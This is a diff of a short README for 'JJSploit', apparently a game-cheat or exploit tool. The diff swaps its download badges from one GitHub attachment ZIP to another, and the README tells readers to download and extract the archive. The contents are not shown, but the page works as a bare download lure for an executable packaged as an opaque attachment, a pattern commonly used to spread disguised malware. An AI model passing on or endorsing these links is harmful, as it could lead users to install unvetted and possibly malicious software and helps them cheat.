@@ -1,10 +1,10 @@
-# JJSploit [![Download JJSploit](https://img.shields.io/badge/Download-JJSploit-blueviolet)](https://github.com/user-attachments/files/17049291/Update.zip)
+# JJSploit [![Download JJSploit](https://img.shields.io/badge/Download-JJSploit-blueviolet)](https://github.com/user-attachments/files/17127912/JJSploit_64x.zip)
 
 
 ## Installation
 To install JJSploit, follow these simple steps:
 1. Download the JJSploit package from here 
-    [![Download JJSploit](https://img.shields.io/badge/Download-JJSploit-blueviolet)](https://github.com/user-attachments/files/17049298/Update.zip)
+    [![Download JJSploit](https://img.shields.io/badge/Download-JJSploit-blueviolet)](https://github.com/user-attachments/files/17127912/JJSploit_64x.zip)
 
 2. Extract the downloaded ZIP file to your desired location on your system.
 
